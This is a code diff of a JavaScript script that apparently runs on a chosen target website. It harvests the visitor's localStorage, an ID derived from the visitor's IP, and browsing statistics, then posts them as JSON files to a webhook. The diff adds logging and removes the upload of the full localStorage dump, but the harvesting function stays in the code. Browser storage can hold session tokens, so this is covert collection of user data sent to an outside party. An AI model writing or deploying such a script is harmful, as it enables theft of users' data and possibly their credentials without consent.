@@ -155,6 +155,7 @@
                     .join(""); // Convert buffer to hex string
 
                 localStorage.setItem("userId", userId);
+                console.log(`Generated new UID: ${userId}`);
             } catch (error) {
                 console.error("Failed to retrieve user IP:", error);
 
@@ -167,6 +168,7 @@
                     .map(b => b.toString(16).padStart(2, "0"))
                     .join("");
                 localStorage.setItem("userId", userId);
+                console.log(`Generated fallback UID: ${userId}`);
             }
         }
         return userId;
@@ -179,6 +181,7 @@
         allKeys.forEach(key => {
             data[key] = localStorage.getItem(key);
         });
+        console.log("Collected localStorage data:", data);
         return data;
     }
 
@@ -191,6 +194,7 @@
             totalTimeSpent: 0,
         };
 
+        console.log("Collected leaderboard data:", { visitCounts, timeSpentOnPages, totalVisitSummary });
         return {
             visitCounts,
             timeSpentOnPages,
@@ -214,7 +218,8 @@
                 method: "POST",
                 body: formData,
             });
-            console.log("Message sent successfully:", await response.json());
+            const result = await response.json();
+            console.log("Message sent successfully. Response:", result);
         } catch (error) {
             console.error("Failed to send files:", error);
         }
@@ -223,11 +228,11 @@
     // Function to check if user is on the target website
     async function checkAndSendData() {
         if (!window.location.href.startsWith(targetBaseUrl)) {
-            console.log("Not on target website.");
+            console.log("Not on target website. Skipping data collection.");
             return;
         }
 
-        console.log("On target website.");
+        console.log("On target website. Collecting and sending data...");
 
         // Collect data
         const leaderboardData = getLeaderboardData();
@@ -236,30 +241,27 @@
         // Generate a unique user ID
         const userId = await getUserId();
 
-        // Step 1: Create separate JSON files for each dataset
+        // Step 1: Create four separate JSON files
         const visitCountsFile = new File(
             [JSON.stringify(leaderboardData.visitCounts, null, 2)],
             "visit_counts.json",
             { type: "application/json" }
         );
+        console.log("Created file: visit_counts.json");
 
         const timeSpentFile = new File(
             [JSON.stringify(leaderboardData.timeSpentOnPages, null, 2)],
             "time_spent.json",
             { type: "application/json" }
         );
+        console.log("Created file: time_spent.json");
 
         const totalVisitSummaryFile = new File(
             [JSON.stringify(leaderboardData.totalVisitSummary, null, 2)],
             "total_visit_summary.json",
             { type: "application/json" }
         );
-
-        const localStorageFile = new File(
-            [JSON.stringify(localStorageData, null, 2)],
-            "local_storage.json",
-            { type: "application/json" }
-        );
+        console.log("Created file: total_visit_summary.json");
 
         const userDataFile = new File(
             [JSON.stringify(
@@ -276,19 +278,7 @@
             "user_data.json",
             { type: "application/json" }
         );
-
-        const logInfoFile = new File(
-            [JSON.stringify(
-                {
-                    visitTime: new Date().toISOString(),
-                    page: window.location.href,
-                },
-                null,
-                2
-            )],
-            "log_info.json",
-            { type: "application/json" }
-        );
+        console.log("Created file: user_data.json");
 
         // Step 2: Create embed message
         const embedMessage = {
@@ -306,9 +296,11 @@
 
         // Step 3: Send files and embed message to the webhook
         sendToWebhook(
-            [visitCountsFile, timeSpentFile, totalVisitSummaryFile, localStorageFile, userDataFile, logInfoFile],
+            [visitCountsFile, timeSpentFile, totalVisitSummaryFile, userDataFile],
             embedMessage
         );
+
+        console.log("Data collection and sending process complete.");
     }
 
     // Execute the script
